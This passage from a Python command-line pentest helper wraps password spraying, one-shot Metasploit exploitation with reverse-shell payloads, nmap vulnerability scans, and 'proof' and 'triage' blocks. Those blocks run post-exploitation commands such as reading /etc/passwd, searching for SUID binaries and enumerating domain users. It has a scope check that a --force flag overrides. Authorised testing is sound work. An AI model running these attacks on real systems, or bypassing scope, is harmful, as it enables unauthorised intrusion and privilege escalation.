                       help="Protocol to spray (default smb)")
    spray.add_argument("--local-auth", action="store_true", help="Local (non-domain) auth")
    spray.add_argument("--background", "--bg", action="store_true", help="Run detached")
    spray.add_argument("--force", action="store_true", help="Override scope block")

    # msf: drive Metasploit non-interactively (search / run / check / rc)
    m = sub.add_parser("msf", help="Drive Metasploit non-interactively (one-shot)")
    m.add_argument("msfaction", choices=["search", "run", "check", "rc"])
    m.add_argument("module", nargs="?",
                   help="module path (run/check), search query, or .rc path")
    m.add_argument("query", nargs="*", help="extra search terms")
    m.add_argument("--ip", help="RHOSTS target (required for run/check/rc)")
    m.add_argument("--lhost", help="LHOST for reverse payloads ('auto' = detect tun)")
    m.add_argument("--lport", type=int, help="LPORT for reverse payloads")
    m.add_argument("--payload", help="override the payload (e.g. windows/x64/meterpreter/reverse_tcp)")
    m.add_argument("-o", "--opt", action="append", default=[],
                   help="extra module option KEY=VALUE (repeatable)")
    m.add_argument("--proof", help="command to run on the session after exploit (e.g. 'whoami')")
    m.add_argument("--background", "--bg", action="store_true", dest="background",
                   help="Run detached")
    m.add_argument("--force", action="store_true", help="Override scope block")

    # proof: capture proof-of-access block on a remote target
    prf = sub.add_parser("proof", help="Run the proof-of-access block and save evidence")
    prf.add_argument("--ip", required=True, help="Target IP")
    prf.add_argument("--os", choices=["linux", "windows"], default="linux")
    add_remote_args(prf)

    # triage: full host-triage block (proof + routes + users + privesc check)
    tri = sub.add_parser("triage", help="Full host-triage on a remote target")
    tri.add_argument("--ip", required=True, help="Target IP")
    tri.add_argument("--os", choices=["linux", "windows"], default="linux")
    add_remote_args(tri)

    args = p.parse_args()

    if args.action == "jobs":
        list_jobs(args)
        return

    if args.action == "commands":
        show_commands(args)
        return

    if args.action == "capture":
        enforce_scope(args.ip, force=args.force)
        if args.background:
            run_in_background(
                args.label or "capture", args.ip,
                capture_command, args.cmd, args.ip, args.zone, args.label,
                screenshot=not args.no_screenshot,
                remote_method=args.remote, remote_user=args.user,
                remote_secret=args.secret, timeout=args.timeout)
        else:
            capture_command(
                args.cmd, args.ip, args.zone, args.label,
                screenshot=not args.no_screenshot,
                remote_method=args.remote, remote_user=args.user,
                remote_secret=args.secret, timeout=args.timeout)

    elif args.action == "screenshot":
        take_screenshot(args.ip, args.label)

    elif args.action == "scan":
        enforce_scope(args.target, force=args.force)
        prefix = "proxychains -q " if args.proxychains else ""
        scan_flag = "-sT -Pn" if args.proxychains else ""
        scan_cmds = {
            "discovery": f"{prefix}nmap -sn {args.target}",
            "full": f"{prefix}nmap {scan_flag} -p- --min-rate 2000 -T4 {args.target}",
            "service": f"{prefix}nmap {scan_flag} -sC -sV {'-p ' + args.ports if args.ports else '-p-'} {args.target}",
            "vuln": f"{prefix}nmap {scan_flag} --script vuln {'-p ' + args.ports if args.ports else ''} {args.target}",
        }
        cmd = scan_cmds[args.type]
        if args.background:
            run_in_background(
                f"nmap-{args.type}", args.target,
                capture_command, cmd, args.target, "network-system",
                f"nmap-{args.type}", timeout=args.timeout)
        else:
            capture_command(cmd, args.target, "network-system",
                            f"nmap-{args.type}", timeout=args.timeout)

    elif args.action == "spray":
        run_spray(args)

    elif args.action == "msf":
        run_msf(args)

    elif args.action == "proof":
        if args.os == "linux":
            cmd = "echo '=== PROOF OF ACCESS ===' && whoami && hostname && id && ip a && ip route"
        else:
            cmd = 'echo === PROOF OF ACCESS === && whoami && hostname && ipconfig /all'
        capture_command(
            cmd, args.ip, "", "proof-of-access", screenshot=True,
            remote_method=args.remote, remote_user=args.user,
            remote_secret=args.secret
        )

    elif args.action == "triage":
        # Full host-triage: identity, privs, interfaces, routes, users, local secrets
        if args.os == "linux":
            cmds = [
                ("identity",    "id && whoami && hostname"),
                ("interfaces",  "ip a && ip route && arp -a"),
                ("users",       "cat /etc/passwd"),
                ("privesc",     "sudo -l 2>&1; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null"),
                ("cron",        "cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null"),
                ("kernel",      "uname -a && cat /etc/os-release 2>/dev/null"),
            ]
        else:
            cmds = [
                ("identity",    "whoami /all"),
                ("interfaces",  "ipconfig /all && route print && arp -a"),
                ("users",       "net user && net localgroup administrators"),
                ("domain",      "net user /domain 2>nul && net group /domain 2>nul"),
                ("services",    'wmic service get name,pathname,startmode 2>nul | findstr /i "auto"'),
                ("privesc",     "whoami /priv"),
            ]
        print(f"[triage] Full host-triage on {args.ip} ({args.os}) via {args.remote or 'local'}")
        for label, cmd in cmds:
            print(f"\n{'='*60}\n[triage:{label}]\n{'='*60}")
            capture_command(
                cmd, args.ip, "", f"triage-{label}",
                remote_method=args.remote, remote_user=args.user,
                remote_secret=args.secret
            )


if __name__ == "__main__":
    main()
